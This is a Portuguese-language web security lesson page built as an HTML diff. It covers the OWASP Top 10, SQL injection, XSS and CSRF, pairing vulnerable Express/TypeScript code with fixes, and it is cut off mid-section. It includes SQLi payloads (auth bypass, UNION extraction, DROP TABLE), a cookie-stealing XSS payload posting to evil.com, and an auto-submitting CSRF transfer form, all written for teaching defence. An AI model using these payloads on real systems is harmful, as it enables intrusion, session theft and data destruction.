@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aula 4 — Segurança em Aplicações Web</title>
+<style>
+:root {
+  --bg:#0f1117;--bg2:#1a1d27;--bg3:#222635;--border:#2e3347;
+  --text:#e2e8f0;--muted:#8892a4;--subtle:#4a5568;
+  --red:#f87171;--rbg:rgba(248,113,113,.12);--rbdr:rgba(248,113,113,.3);
+  --grn:#4ade80;--gbg:rgba(74,222,128,.12);--gbdr:rgba(74,222,128,.3);
+  --amb:#fbbf24;--abg:rgba(251,191,36,.12);--abdr:rgba(251,191,36,.3);
+  --blu:#60a5fa;--bbg:rgba(96,165,250,.12);--bbdr:rgba(96,165,250,.3);
+  --pur:#a78bfa;--pubg:rgba(167,139,250,.12);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6}
+.app{display:flex;min-height:100vh}
+.sidebar{width:250px;background:var(--bg2);border-right:1px solid var(--border);position:fixed;height:100vh;overflow-y:auto}
+.main{margin-left:250px;padding:2rem;max-width:860px}
+.sh{padding:1.25rem 1rem .75rem;border-bottom:1px solid var(--border)}
+.sh h2{font-size:12px;font-weight:700;color:var(--muted);letter-spacing:.08em;text-transform:uppercase}
+.sh p{font-size:12px;color:var(--subtle);margin-top:3px}
+.ni{display:flex;align-items:center;gap:8px;padding:9px 1rem;cursor:pointer;border-left:3px solid transparent;font-size:13px;color:var(--muted);transition:all .15s}
+.ni:hover{background:var(--bg3);color:var(--text)}
+.ni.active{background:var(--bg3);color:var(--text);border-left-color:var(--blu)}
+.nn{font-size:10px;font-weight:700;width:18px;opacity:.5}
+.section{display:none}
+.section.active{display:block;animation:fi .2s ease}
+@keyframes fi{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
+.hero{margin-bottom:1.75rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border)}
+.badge{display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;margin-bottom:10px;text-transform:uppercase;letter-spacing:.05em}
+.badge.r{background:var(--rbg);color:var(--red);border:1px solid var(--rbdr)}
+.badge.a{background:var(--abg);color:var(--amb);border:1px solid var(--abdr)}
+.badge.g{background:var(--gbg);color:var(--grn);border:1px solid var(--gbdr)}
+.badge.b{background:var(--bbg);color:var(--blu);border:1px solid var(--bbdr)}
+.badge.p{background:var(--pubg);color:var(--pur);border:1px solid rgba(167,139,250,.3)}
+.hero h1{font-size:26px;font-weight:700;margin-bottom:6px}
+.hero p{font-size:14px;color:var(--muted)}
+.tabs{display:flex;border-bottom:1px solid var(--border);margin-bottom:1.25rem;overflow-x:auto}
+.tab{padding:8px 14px;font-size:13px;font-weight:500;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px;white-space:nowrap;transition:all .15s;user-select:none}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--blu);border-bottom-color:var(--blu)}
+.tc{display:none}
+.tc.active{display:block}
+.cw{background:#0d0f18;border:1px solid var(--border);border-radius:8px;margin:.75rem 0;overflow:hidden}
+.ch{display:flex;justify-content:space-between;align-items:center;padding:7px 14px;border-bottom:1px solid var(--border);background:#13151f}
+.cl{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.04em;text-transform:uppercase}
+.ck{font-size:11px;color:var(--subtle)}
+pre{padding:.9rem 1.1rem;font-family:'Consolas','Fira Code',monospace;font-size:12.5px;line-height:1.8;overflow-x:auto;color:#cdd6f4}
+.kw{color:#cba6f7}.str{color:#a6e3a1}.fn{color:#89b4fa}
+.cm{color:#585b70;font-style:italic}.nm{color:#fab387}
+.vr{color:#f38ba8}.tp{color:#f9e2af}
+.cg{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:10px;margin:1rem 0}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px}
+.card h4{font-size:13px;font-weight:600;margin-bottom:5px}
+.card p{font-size:12px;color:var(--muted);line-height:1.5}
+.card.r{border-left:3px solid var(--red)}.card.a{border-left:3px solid var(--amb)}
+.card.b{border-left:3px solid var(--blu)}.card.g{border-left:3px solid var(--grn)}
+.alert{border-radius:6px;padding:11px 14px;margin:.75rem 0;font-size:13px;line-height:1.6}
+.alert strong{display:block;font-weight:600;margin-bottom:2px}
+.alert.d{background:var(--rbg);border:1px solid var(--rbdr);color:var(--red)}
+.alert.w{background:var(--abg);border:1px solid var(--abdr);color:var(--amb)}
+.alert.s{background:var(--gbg);border:1px solid var(--gbdr);color:var(--grn)}
+.alert.i{background:var(--bbg);border:1px solid var(--bbdr);color:var(--blu)}
+.cl2{list-style:none}
+.cl2 li{display:flex;align-items:flex-start;gap:9px;padding:8px 0;border-bottom:1px solid var(--border);font-size:13px}
+.cl2 li:last-child{border:none}
+.ck2{width:19px;height:19px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;flex-shrink:0;margin-top:2px}
+.ck2.ok{background:var(--gbg);color:var(--grn)}.ck2.wn{background:var(--abg);color:var(--amb)}
+.og{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin:1rem 0}
+.oc{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:9px 11px}
+.oc.hl{background:var(--rbg);border-color:var(--rbdr)}
+.or{font-size:10px;font-weight:700;color:var(--subtle);text-transform:uppercase;margin-bottom:3px}
+.oc.hl .or{color:var(--red)}.on{font-size:12px;font-weight:600;color:var(--muted)}
+.oc.hl .on{color:var(--red)}
+.demo{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.1rem;margin:1rem 0}
+.demo h4{font-size:13px;font-weight:600;margin-bottom:10px}
+.di{width:100%;padding:8px 11px;background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:'Consolas',monospace;font-size:13px;margin-bottom:7px}
+.di:focus{outline:none;border-color:var(--blu)}
+.br{display:flex;gap:7px;flex-wrap:wrap}
+.btn{padding:7px 15px;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;border:1px solid;transition:opacity .15s}
+.btn:hover{opacity:.8}
+.btn.d{background:var(--rbg);color:var(--red);border-color:var(--rbdr)}
+.btn.s{background:var(--gbg);color:var(--grn);border-color:var(--gbdr)}
+.btn.n{background:var(--bg3);color:var(--muted);border-color:var(--border)}
+.dr{margin-top:10px;padding:9px 13px;border-radius:6px;font-family:'Consolas',monospace;font-size:12px;line-height:1.7;white-space:pre-wrap;display:none}
+.dr.bad{background:var(--rbg);border:1px solid var(--rbdr);color:var(--red)}
+.dr.good{background:var(--gbg);border:1px solid var(--gbdr);color:var(--grn)}
+.nf{display:flex;justify-content:space-between;align-items:center;margin-top:2rem;padding-top:1.25rem;border-top:1px solid var(--border)}
+.nb{display:flex;align-items:center;gap:5px;padding:8px 16px;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:var(--bg2);color:var(--muted);transition:all .15s}
+.nb:hover{border-color:var(--blu);color:var(--blu)}
+.nb.p{background:var(--bbg);color:var(--blu);border-color:var(--bbdr)}
+.np{font-size:12px;color:var(--subtle)}
+code{background:var(--bg3);padding:1px 5px;border-radius:4px;font-family:'Consolas',monospace;font-size:12px;color:var(--amb)}
+h3{font-size:17px;font-weight:600;margin:1.25rem 0 .6rem}
+p{font-size:14px;color:var(--muted);margin-bottom:.6rem}
+@media(max-width:700px){.sidebar{display:none}.main{margin-left:0;padding:1rem}}
+</style>
+</head>
+<body>
+<div class="app">
+<nav class="sidebar">
+  <div class="sh"><h2>🔐 Web Security</h2><p>Node.js + Express + TypeScript</p></div>
+  <div id="nav"></div>
+</nav>
+<main class="main" id="content"></main>
+</div>
+<script>
+var sections = [
+  { id:'owasp', num:'01', icon:'📋', label:'OWASP Top 10' },
+  { id:'sqli',  num:'02', icon:'💉', label:'SQL Injection' },
+  { id:'xss',   num:'03', icon:'📜', label:'XSS' },
+  { id:'csrf',  num:'04', icon:'🎭', label:'CSRF' },
+  { id:'auth',  num:'05', icon:'🔑', label:'Autenticação Fraca' },
+  { id:'misc',  num:'06', icon:'🛡️', label:'Outros Ataques' },
+  { id:'proj',  num:'07', icon:'🛠️', label:'Projeto Prático' }
+];
+
+var html = {
+owasp: '<div class="hero"><div class="badge b">📚 Fundamentos</div><h1>OWASP Top 10 — 2021</h1><p>Padrão global dos 10 riscos mais críticos em segurança web. Base de toda a aula.</p></div>'
++'<p>O OWASP (Open Web Application Security Project) é uma fundação sem fins lucrativos que publica guias e ferramentas para segurança. O Top 10 é o documento mais referenciado do setor.</p>'
++'<div class="og">'
++'<div class="oc hl"><div class="or">A01:2021</div><div class="on">Broken Access Control</div></div>'
++'<div class="oc hl"><div class="or">A02:2021</div><div class="on">Cryptographic Failures</div></div>'
++'<div class="oc hl"><div class="or">A03:2021</div><div class="on">Injection</div></div>'
++'<div class="oc"><div class="or">A04:2021</div><div class="on">Insecure Design</div></div>'
++'<div class="oc"><div class="or">A05:2021</div><div class="on">Security Misconfiguration</div></div>'
++'<div class="oc"><div class="or">A06:2021</div><div class="on">Vulnerable Components</div></div>'
++'<div class="oc hl"><div class="or">A07:2021</div><div class="on">Auth Failures</div></div>'
++'<div class="oc"><div class="or">A08:2021</div><div class="on">Integrity Failures</div></div>'
++'<div class="oc"><div class="or">A09:2021</div><div class="on">Logging Failures</div></div>'
++'<div class="oc"><div class="or">A10:2021</div><div class="on">SSRF</div></div>'
++'</div>'
++'<div class="alert i"><strong>📌 Cobertura desta aula</strong>A01 (CSRF/Controle de Acesso), A02 (Cripto fraca), A03 (SQLi/XSS) e A07 (Autenticação fraca) — os itens em vermelho acima.</div>'
++'<div class="cg">'
++'<div class="card r"><h4>🎯 Vulnerabilidade</h4><p>Fraqueza explorada por atacantes para comprometer segurança, dados ou disponibilidade da aplicação.</p></div>'
++'<div class="card a"><h4>⚔️ Vetor de Ataque</h4><p>Caminho usado pelo atacante: entrada de usuário, headers HTTP, cookies, arquivos, APIs.</p></div>'
++'<div class="card b"><h4>💥 Impacto</h4><p>Consequência: vazamento de dados, acesso não autorizado, execução de código malicioso, DoS.</p></div>'
++'<div class="card g"><h4>🛡️ Mitigação</h4><p>Práticas, padrões e ferramentas que reduzem a superfície de ataque e protegem a aplicação.</p></div>'
++'</div>',
+
+sqli: '<div class="hero"><div class="badge r">💉 OWASP A03:2021 — Crítico</div><h1>SQL Injection</h1><p>Dados não sanitizados interpolados diretamente em queries SQL permitem ao atacante manipular, vazar ou destruir dados do banco.</p></div>'
++'<div class="alert d"><strong>⚠️ Por que é crítico?</strong>Login sem senha, extração de toda a base de dados, deleção de tabelas e em alguns casos execução de comandos no sistema operacional.</div>'
++'<div class="tabs" id="sqli-tabs">'
++'<div class="tab active" data-tab="sqli-vuln">❌ Vulnerável</div>'
++'<div class="tab" data-tab="sqli-atk">⚔️ Ataque</div>'
++'<div class="tab" data-tab="sqli-fix">✅ Seguro</div>'
++'<div class="tab" data-tab="sqli-orm">🔧 Prisma/ORM</div>'
++'</div>'
++'<div class="tc active" id="sqli-vuln">'
++'<div class="cw"><div class="ch"><span class="cl">❌ src/routes/auth.ts — VULNERÁVEL</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="cm">// NUNCA interpole variáveis diretamente em SQL!</span>\n'
++'<span class="kw">export async function</span> <span class="fn">loginVulneravel</span>(req, res) {\n'
++'  <span class="kw">const</span> { username, password } = req.body\n\n'
++'  <span class="cm">// ❌ Interpolação direta — CRÍTICO</span>\n'
++'  <span class="kw">const</span> query = <span class="str">"SELECT * FROM users WHERE username = \'" + username + "\' AND password = \'" + password + "\'"</span>\n\n'
++'  <span class="cm">// O atacante controla o SQL executado!</span>\n'
++'  <span class="kw">const</span> users = <span class="kw">await</span> db.<span class="fn">query</span>(query)\n'
++'  <span class="kw">if</span> (users.length > <span class="nm">0</span>) res.<span class="fn">json</span>({ ok: <span class="kw">true</span> })\n'
++'}'
++'</pre></div></div>'
+
++'<div class="tc" id="sqli-atk">'
++'<div class="demo"><h4>🧪 Simulador de SQL Injection</h4>'
++'<label style="font-size:12px;color:var(--muted);display:block;margin-bottom:4px">Username</label>'
++'<input class="di" id="s-user" value="\' OR \'1\'=\'1">'
++'<label style="font-size:12px;color:var(--muted);display:block;margin-bottom:4px">Password</label>'
++'<input class="di" id="s-pass" value="qualquer coisa">'
++'<div class="br">'
++'<button class="btn d" onclick="simSQLI()">⚔️ Simular Ataque</button>'
++'<button class="btn n" onclick="rstSQLI()">↺ Resetar</button>'
++'</div>'
++'<div class="dr bad" id="sqli-r"></div>'
++'</div>'
++'<div class="cw"><div class="ch"><span class="cl">Payloads clássicos de SQLi</span></div>'
++'<pre>'
++'<span class="cm">-- 1. Bypass de autenticação</span>\n'
++'username: <span class="str">\' OR \'1\'=\'1</span>\n'
++'<span class="cm">-- Resulta em: WHERE username = \'\' OR \'1\'=\'1\' AND ...</span>\n\n'
++'<span class="cm">-- 2. Ignora senha com comentário SQL</span>\n'
++'username: <span class="str">admin\'--</span>\n'
++'<span class="cm">-- Resulta em: WHERE username = \'admin\'-- AND password...</span>\n\n'
++'<span class="cm">-- 3. Extrai outros dados com UNION</span>\n'
++'<span class="str">\' UNION SELECT email,senha,null FROM admins--</span>\n\n'
++'<span class="cm">-- 4. Destruição de dados</span>\n'
++'<span class="str">\'; DROP TABLE users;--</span>'
++'</pre></div></div>'
+
++'<div class="tc" id="sqli-fix">'
++'<div class="cw"><div class="ch"><span class="cl">✅ Prepared Statements + Zod</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> { z } <span class="kw">from</span> <span class="str">\'zod\'</span>\n'
++'<span class="kw">import</span> bcrypt <span class="kw">from</span> <span class="str">\'bcrypt\'</span>\n\n'
++'<span class="kw">const</span> LoginSchema = z.<span class="fn">object</span>({\n'
++'  username: z.<span class="fn">string</span>().<span class="fn">min</span>(<span class="nm">3</span>).<span class="fn">max</span>(<span class="nm">50</span>).<span class="fn">regex</span>(<span class="str">/^[a-zA-Z0-9_]+$/</span>),\n'
++'  password: z.<span class="fn">string</span>().<span class="fn">min</span>(<span class="nm">8</span>).<span class="fn">max</span>(<span class="nm">100</span>),\n'
++'})\n\n'
++'<span class="kw">export async function</span> <span class="fn">loginSeguro</span>(req, res) {\n'
++'  <span class="kw">const</span> result = LoginSchema.<span class="fn">safeParse</span>(req.body)\n'
++'  <span class="kw">if</span> (!result.success)\n'
++'    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="nm">400</span>).<span class="fn">json</span>({ error: <span class="str">\'Dados inválidos\'</span> })\n\n'
++'  <span class="kw">const</span> { username, password } = result.data\n\n'
++'  <span class="cm">// ✅ Parâmetros separados da query — nunca interpolados</span>\n'
++'  <span class="kw">const</span> [rows] = <span class="kw">await</span> db.<span class="fn">execute</span>(\n'
++'    <span class="str">\'SELECT id, password_hash FROM users WHERE username = ?\'</span>,\n'
++'    [username]\n'
++'  )\n\n'
++'  <span class="cm">// ✅ Tempo constante — evita timing attack</span>\n'
++'  <span class="kw">if</span> (rows.length === <span class="nm">0</span>) {\n'
++'    <span class="kw">await</span> bcrypt.<span class="fn">compare</span>(password, <span class="str">\'$2b$12$placeholder\'</span>)\n'
++'    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="nm">401</span>).<span class="fn">json</span>({ error: <span class="str">\'Credenciais inválidas\'</span> })\n'
++'  }\n'
++'  <span class="kw">const</span> ok = <span class="kw">await</span> bcrypt.<span class="fn">compare</span>(password, rows[<span class="nm">0</span>].password_hash)\n'
++'  <span class="kw">if</span> (!ok) <span class="kw">return</span> res.<span class="fn">status</span>(<span class="nm">401</span>).<span class="fn">json</span>({ error: <span class="str">\'Credenciais inválidas\'</span> })\n'
++'  res.<span class="fn">json</span>({ token: <span class="fn">generateToken</span>(rows[<span class="nm">0</span>].id) })\n'
++'}'
++'</pre></div>'
++'<ul class="cl2">'
++'<li><span class="ck2 ok">✓</span><span>Use sempre <strong>Prepared Statements</strong> — parâmetros separados da query SQL</span></li>'
++'<li><span class="ck2 ok">✓</span><span>Valide inputs com <code>zod</code> ou <code>joi</code> antes de qualquer processamento</span></li>'
++'<li><span class="ck2 ok">✓</span><span>Use o princípio do menor privilégio no usuário do banco de dados</span></li>'
++'<li><span class="ck2 ok">✓</span><span>Nunca compare senhas em texto puro — use <code>bcrypt.compare()</code></span></li>'
++'</ul></div>'
+
++'<div class="tc" id="sqli-orm">'
++'<div class="cw"><div class="ch"><span class="cl">✅ Prisma ORM — parametrizado por padrão</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> { PrismaClient } <span class="kw">from</span> <span class="str">\'@prisma/client\'</span>\n'
++'<span class="kw">const</span> prisma = <span class="kw">new</span> <span class="fn">PrismaClient</span>()\n\n'
++'<span class="cm">// ✅ Prisma parametriza automaticamente</span>\n'
++'<span class="kw">const</span> user = <span class="kw">await</span> prisma.user.<span class="fn">findUnique</span>({\n'
++'  where: { username },\n'
++'  select: { id: <span class="kw">true</span>, passwordHash: <span class="kw">true</span> }\n'
++'})\n\n'
++'<span class="cm">// Raw query segura com template literal do Prisma</span>\n'
++'<span class="cm">// (template literals do Prisma são parametrizados)</span>\n'
++'<span class="kw">const</span> result = <span class="kw">await</span> prisma.<span class="fn">$queryRaw</span>(...)\n\n'
++'<span class="cm">// TypeORM também é seguro:</span>\n'
++'<span class="kw">await</span> userRepo.<span class="fn">findOne</span>({ where: { username } })\n\n'
++'<span class="cm">// Knex.js:</span>\n'
++'<span class="kw">await</span> db(<span class="str">\'users\'</span>).<span class="fn">where</span>({ username }).<span class="fn">first</span>()'
++'</pre></div>'
++'<div class="alert i"><strong>💡 Recomendação</strong>Em projetos TypeScript, use Prisma como ORM principal. Além de seguro por padrão, oferece tipagem completa gerada a partir do schema do banco.</div>'
++'</div>',
+
+xss: '<div class="hero"><div class="badge r">📜 OWASP A03:2021 — Alto</div><h1>Cross-Site Scripting (XSS)</h1><p>Dados não confiáveis incluídos em páginas web sem encoding adequado permitem execução de scripts maliciosos no browser da vítima.</p></div>'
++'<div class="cg">'
++'<div class="card r"><h4>Reflected XSS</h4><p>Script vem da requisição atual (URL/form). Não persiste. Requer que a vítima clique em link malicioso.</p></div>'
++'<div class="card a"><h4>Stored XSS</h4><p>Script salvo no banco é executado para todos que visualizarem o conteúdo. O mais perigoso.</p></div>'
++'<div class="card b"><h4>DOM-based XSS</h4><p>Manipulação do DOM via JS no cliente sem passar pelo servidor. Difícil de detectar.</p></div>'
++'</div>'
++'<div class="tabs" id="xss-tabs">'
++'<div class="tab active" data-tab="xss-vuln">❌ Vulnerável</div>'
++'<div class="tab" data-tab="xss-demo">🧪 Demo</div>'
++'<div class="tab" data-tab="xss-fix">✅ Proteção</div>'
++'<div class="tab" data-tab="xss-csp">🔒 CSP/Helmet</div>'
++'</div>'
+
++'<div class="tc active" id="xss-vuln">'
++'<div class="cw"><div class="ch"><span class="cl">❌ Stored XSS — comentários sem sanitização</span></div>'
++'<pre>'
++'<span class="cm">// Backend: salva HTML diretamente no banco</span>\n'
++'app.<span class="fn">post</span>(<span class="str">\'/comentarios\'</span>, <span class="kw">async</span> (req, res) => {\n'
++'  <span class="kw">const</span> { texto } = req.body\n'
++'  <span class="cm">// ❌ Salva qualquer HTML/JS sem filtrar</span>\n'
++'  <span class="kw">await</span> db.<span class="fn">query</span>(<span class="str">\'INSERT INTO comentarios (texto) VALUES (?)\'</span>, [texto])\n'
++'})\n\n'
++'<span class="cm">// Frontend — ❌ innerHTML executa scripts!</span>\n'
++'div.innerHTML = comentario.texto\n\n'
++'<span class="cm">// Payload do atacante como comentário:</span>\n'
++'<span class="str">"&lt;script&gt;fetch(\'https://evil.com/?c=\'+document.cookie)&lt;/script&gt;"</span>\n'
++'<span class="str">"&lt;img src=x onerror=\'alert(1)\'&gt;"</span>'
++'</pre></div></div>'
+
++'<div class="tc" id="xss-demo">'
++'<div class="demo"><h4>🧪 Simulador XSS — Área de Comentários</h4>'
++'<label style="font-size:12px;color:var(--muted);display:block;margin-bottom:4px">Comentário (tente payloads XSS):</label>'
++'<input class="di" id="xss-in" value="&lt;img src=x onerror=alert(1)&gt;">'
++'<div class="br">'
++'<button class="btn d" onclick="xssUnsafe()">⚠️ SEM proteção (innerHTML)</button>'
++'<button class="btn s" onclick="xssSafe()">✅ COM proteção (textContent)</button>'
++'</div>'
++'<div class="dr bad" id="xss-bad"></div>'
++'<div class="dr good" id="xss-ok"></div>'
++'</div></div>'
+
++'<div class="tc" id="xss-fix">'
++'<div class="cw"><div class="ch"><span class="cl">✅ Backend — sanitização com DOMPurify</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> createDOMPurify <span class="kw">from</span> <span class="str">\'dompurify\'</span>\n'
++'<span class="kw">import</span> { JSDOM } <span class="kw">from</span> <span class="str">\'jsdom\'</span>\n\n'
++'<span class="kw">const</span> window = <span class="kw">new</span> <span class="fn">JSDOM</span>(<span class="str">\'\'</span>).window\n'
++'<span class="kw">const</span> DOMPurify = <span class="fn">createDOMPurify</span>(window <span class="kw">as any</span>)\n\n'
++'<span class="kw">export function</span> <span class="fn">sanitizeHtml</span>(input: <span class="tp">string</span>): <span class="tp">string</span> {\n'
++'  <span class="kw">return</span> DOMPurify.<span class="fn">sanitize</span>(input, {\n'
++'    ALLOWED_TAGS: [<span class="str">\'b\'</span>, <span class="str">\'i\'</span>, <span class="str">\'em\'</span>, <span class="str">\'strong\'</span>, <span class="str">\'p\'</span>],\n'
++'    ALLOWED_ATTR: [],  <span class="cm">// zero atributos — remove onclick, onerror</span>\n'
++'  })\n'
++'}\n\n'
++'app.<span class="fn">post</span>(<span class="str">\'/comentarios\'</span>, <span class="kw">async</span> (req, res) => {\n'
++'  <span class="kw">const</span> textoLimpo = <span class="fn">sanitizeHtml</span>(req.body.texto)\n'
++'  <span class="kw">await</span> db.<span class="fn">query</span>(<span class="str">\'INSERT INTO comentarios (texto) VALUES (?)\'</span>, [textoLimpo])\n'
++'})'
++'</pre></div>'
++'<div class="cw"><div class="ch"><span class="cl">✅ Frontend — escape e React</span></div>'
++'<pre>'
++'<span class="cm">// ✅ textContent para texto puro — nunca executa HTML</span>\n'
++'div.textContent = comentario.texto\n\n'
++'<span class="cm">// ✅ Escape manual</span>\n'
++'<span class="kw">function</span> <span class="fn">esc</span>(s: <span class="tp">string</span>) {\n'
++'  <span class="kw">return</span> s\n'
++'    .<span class="fn">replace</span>(<span class="str">/&amp;/g</span>, <span class="str">\'&amp;amp;\'</span>)\n'
++'    .<span class="fn">replace</span>(<span class="str">/&lt;/g</span>, <span class="str">\'&amp;lt;\'</span>)\n'
++'    .<span class="fn">replace</span>(<span class="str">/&gt;/g</span>, <span class="str">\'&amp;gt;\'</span>)\n'
++'    .<span class="fn">replace</span>(<span class="str">/"/g</span>,  <span class="str">\'&amp;quot;\'</span>)\n'
++'}\n\n'
++'<span class="cm">// ✅ React: JSX escapa automaticamente!</span>\n'
++'<span class="kw">const</span> Comentario = ({ texto }) => &lt;p&gt;{texto}&lt;/p&gt;\n'
++'<span class="cm">// ❌ Evite dangerouslySetInnerHTML!</span>'
++'</pre></div></div>'
+
++'<div class="tc" id="xss-csp">'
++'<div class="cw"><div class="ch"><span class="cl">✅ Helmet.js — headers de segurança</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> helmet <span class="kw">from</span> <span class="str">\'helmet\'</span>\n\n'
++'app.<span class="fn">use</span>(<span class="fn">helmet</span>())  <span class="cm">// aplica ~14 headers automaticamente</span>\n\n'
++'app.<span class="fn">use</span>(helmet.<span class="fn">contentSecurityPolicy</span>({\n'
++'  directives: {\n'
++'    defaultSrc: [<span class="str">\'\'self\'\'</span>],\n'
++'    scriptSrc:  [<span class="str">\'\'self\'\'</span>],      <span class="cm">// bloqueia scripts inline</span>\n'
++'    styleSrc:   [<span class="str">\'\'self\'\'</span>, <span class="str">\'\'unsafe-inline\'\'</span>],\n'
++'    imgSrc:     [<span class="str">\'\'self\'\'</span>, <span class="str">\'data:\'</span>, <span class="str">\'https:\'</span>],\n'
++'    objectSrc:  [<span class="str">\'\'none\'\'</span>],\n'
++'    frameSrc:   [<span class="str">\'\'none\'\'</span>],\n'
++'  }\n'
++'})\n\n'
++'<span class="cm">/* Headers que o Helmet aplica:\n'
++'   X-Frame-Options: DENY\n'
++'   X-Content-Type-Options: nosniff\n'
++'   Strict-Transport-Security\n'
++'   X-XSS-Protection: 1; mode=block\n'
++'   Referrer-Policy: no-referrer\n'
++'*/'
++'</pre></div></div>',
+
+csrf: '<div class="hero"><div class="badge a">🎭 OWASP A01:2021 — Alto</div><h1>Cross-Site Request Forgery (CSRF)</h1><p>Força usuários autenticados a executar ações indesejadas. O browser envia cookies automaticamente — o atacante explora isso.</p></div>'
++'<div class="alert d"><strong>⚠️ Cenário real</strong>Usuário logado no banco.com visita evil.com. Um form oculto submete para banco.com/transferir com os cookies da sessão. O banco executa a transferência.</div>'
++'<div class="tabs" id="csrf-tabs">'
++'<div class="tab active" data-tab="csrf-flow">🔄 Como Funciona</div>'
++'<div class="tab" data-tab="csrf-token">🔑 CSRF Token</div>'
++'<div class="tab" data-tab="csrf-same">🍪 SameSite Cookie</div>'
++'</div>'
+
++'<div class="tc active" id="csrf-flow">'
++'<div class="cg">'
++'<div class="card b"><h4>1. Usuário loga</h4><p>Cookie de sessão é salvo no browser após login em banco.com.</p></div>'
++'<div class="card a"><h4>2. Acessa evil.com</h4><p>Atacante enviou link. A página tem form HTML oculto apontando para banco.com.</p></div>'
++'<div class="card r"><h4>3. Auto-submit</h4><p>JS submete o form. Browser anexa automaticamente os cookies de banco.com.</p></div>'
++'<div class="card r"><h4>4. Banco processa</h4><p>banco.com recebe cookie válido e executa a transferência sem suspeitar.</p></div>'
++'</div>'
++'<div class="cw"><div class="ch"><span class="cl">Página maliciosa do atacante (evil.com)</span><span class="ck">HTML</span></div>'
++'<pre>'
++'&lt;<span class="kw">form</span> id=<span class="str">"atk"</span>\n'
++'      action=<span class="str">"https://banco.com/api/transferir"</span>\n'
++'      method=<span class="str">"POST"</span> style=<span class="str">"display:none"</span>&gt;\n'
++'  &lt;<span class="kw">input</span> name=<span class="str">"para"</span>  value=<span class="str">"conta-atacante"</span>&gt;\n'
++'  &lt;<span class="kw">input</span> name=<span class="str">"valor"</span> value=<span class="str">"10000"</span>&gt;\n'
++'&lt;/<span class="kw">form</span>&gt;\n'
++'&lt;<span class="kw">script</span>&gt;\n'
++'  document.<span class="fn">getElementById</span>(<span class="str">\'atk\'</span>).<span class="fn">submit</span>()\n'
++'  <span class="cm">// Browser envia cookie automaticamente!</span>\n'
++'&lt;/<span class="kw">script</span>&gt;'
++'</pre></div></div>'
+
++'<div class="tc" id="csrf-token">'
++'<div class="cw"><div class="ch"><span class="cl">✅ CSRF Token — middleware TypeScript</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> csrf <span class="kw">from</span> <span class="str">\'csrf\'</span>\n\n'
++'<span class="kw">const</span> tokens = <span class="kw">new</span> <span class="fn">csrf</span>()\n\n'
++'<span class="cm">// 1. Endpoint que gera o token para o frontend</span>\n'
++'app.<span class="fn">get</span>(<span class="str">\'/api/csrf-token\'</span>, (req, res) => {\n'
++'  <span class="kw">const</span> secret = req.session.csrfSecret ?? tokens.<span class="fn">secretSync</span>()\n'
++'  req.session.csrfSecret = secret\n'
++'  res.<span class="fn">json</span>({ csrfToken: tokens.<span class="fn">create</span>(secret) })\n'
++'})\n\n'
++'<span class="cm">// 2. Middleware de validação</span>\n'
++'<span class="kw">function</span> <span class="fn">csrfProtection</span>(req, res, next) {\n'
++'  <span class="kw">const</span> token = req.headers[<span class="str">\'x-csrf-token\'</span>]\n'
++'  <span class="kw">const</span> secret = req.session.csrfSecret\n'
++'  <span class="kw">if</span> (!secret || !tokens.<span class="fn">verify</span>(secret, token))\n'
++'    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="nm">403</span>).<span class="fn">json</span>({ error: <span class="str">\'CSRF Token inválido\'</span> })\n'
++'  <span class="fn">next</span>()\n'
++'}\n\n'
++'<span class="cm">// 3. Aplicar nos endpoints de mutação</span>\n'
++'app.<span class="fn">post</span>(<span class="str">\'/api/transferir\'</span>, authMiddleware, csrfProtection, handler)\n\n'
++'<span class="cm">// 4. Frontend: envia token no header</span>\n'
++'<span class="kw">const</span> { csrfToken } = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">\'/api/csrf-token\'</span>).<span class="fn">then</span>(r => r.<span class="fn">json</span>())\n'
++'<span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">\'/api/transferir\'</span>, {\n'
++'  method: <span class="str">\'POST\'</span>,\n'
++'  headers: { <span class="str">\'X-CSRF-Token\'</span>: csrfToken, <span class="str">\'Content-Type\'</span>: <span class="str">\'application/json\'</span> },\n'
++'  body: <span class="fn">JSON</span>.<span class="fn">stringify</span>({ para, valor })\n'
++'})'
++'</pre></div></div>'
+
++'<div class="tc" id="csrf-same">'
++'<div class="cw"><div class="ch"><span class="cl">✅ SameSite Cookies — proteção moderna</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'app.<span class="fn">use</span>(<span class="fn">session</span>({\n'
++'  secret: process.env.<span class="nm">SESSION_SECRET</span>,\n'
++'  resave: <span class="kw">false</span>, saveUninitialized: <span class="kw">false</span>,\n'
++'  cookie: {\n'
++'    httpOnly: <span class="kw">true</span>,     <span class="cm">// JS nao acessa o cookie</span>\n'
